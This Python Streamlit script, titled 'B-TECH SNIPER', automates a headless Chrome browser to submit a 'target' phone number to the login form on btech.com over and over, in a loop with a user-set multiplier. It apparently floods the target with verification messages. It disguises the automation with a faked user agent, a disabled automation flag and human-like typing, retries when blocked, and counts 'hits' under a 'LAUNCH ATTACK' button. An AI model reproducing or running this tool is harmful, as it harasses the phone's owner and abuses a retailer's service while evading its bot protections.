import streamlit as st
import time
import random  # حل مشكلة الـ NameError (صورة 6)
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# إعدادات الواجهة (بنفس مظهر برنامجك الأصلي)
st.set_page_config(page_title="B-TECH SNIPER v8.0", page_icon="⚡")

st.markdown("""
    <style>
    .stApp { background-color: #0e1117; color: #2ecc71; }
    .stButton>button { background-color: #27ae60; color: white; border-radius: 8px; font-weight: bold; width: 100%; }
    .stTextInput>div>div>input { background-color: #1e1e1e; color: #2ecc71; border: 1px solid #27ae60; }
    </style>
    """, unsafe_allow_html=True)

if 'count' not in st.session_state: st.session_state.count = 0
if 'logs' not in st.session_state: st.session_state.logs = []
if 'running' not in st.session_state: st.session_state.running = False

def add_log(message):
    now = datetime.now().strftime("%H:%M:%S")
    st.session_state.logs.append(f"[{now}] {message}")
    if len(st.session_state.logs) > 15: st.session_state.logs.pop(0)

def run_btech_attack(phone, drone_id):
    options = Options()
    options.add_argument("--headless=new") 
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_argument(f"--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
    
    driver = None
    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        wait = WebDriverWait(driver, 15)
        
        # 1. الدخول للموقع
        add_log(f"Drone-{drone_id}: Accessing B.TECH...")
        driver.get("https://btech.com/ar/account")
        
        # 2. الضغط على زر الدخول (بناءً على الكود بتاعك)
        login_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'تسجيل دخول') or contains(., 'إنشاء حساب')]")))
        driver.execute_script("arguments[0].click();", login_btn)
        
        # 3. إدخال الرقم
        add_log(f"Drone-{drone_id}: Entering target {phone}...")
        phone_input = wait.until(EC.presence_of_element_located((By.ID, "phone")))
        
        # تمويه: كتابة الرقم حرف حرف كأنك إنسان
        for char in phone:
            phone_input.send_keys(char)
            time.sleep(0.1)
            
        phone_input.send_keys("\ue007") # الضغط على Enter
        
        time.sleep(3) # انتظار التأكيد من السيرفر
        st.session_state.count += 1
        add_log(f"Drone-{drone_id}: ✅ SUCCESS! Hit confirmed.")
        
    except Exception:
        add_log(f"Drone-{drone_id}: ⚠️ Site Busy or Blocked. Retrying...")
    finally:
        if driver: driver.quit()

# --- UI Layout ---
st.title("⚡ ULTIMATE B-TECH SNIPER")
target = st.text_input("Target Phone", placeholder="01xxxxxxxxx")
power = st.select_slider("Select Multiplier", options=[1, 2, 3, 5, 10], value=1)

c1, c2 = st.columns(2)
if c1.button("🔥 LAUNCH ATTACK"):
    if target:
        st.session_state.running = True
        add_log(f"--- ATTACK INITIALIZED ON {target} ---")
    else:
        st.error("Enter phone number!")

if c2.button("🛑 TERMINATE"):
    st.session_state.running = False
    add_log("--- SYSTEM SHUTDOWN ---")

st.metric("SUCCESS HITS", st.session_state.count)

# حل مشكلة الـ Empty Label (صورة 1)
st.subheader("Ghost Logs")
log_text = "\n".join(st.session_state.logs[::-1])
st.text_area("Live Logs Output", value=log_text, height=250, disabled=True, label_visibility="collapsed")

if st.session_state.running:
    # تشغيل الهجوم بعدد الموجات المطلوبة
    for _ in range(power):
        run_btech_attack(target, random.randint(10, 99))
    time.sleep(1)
    st.rerun()
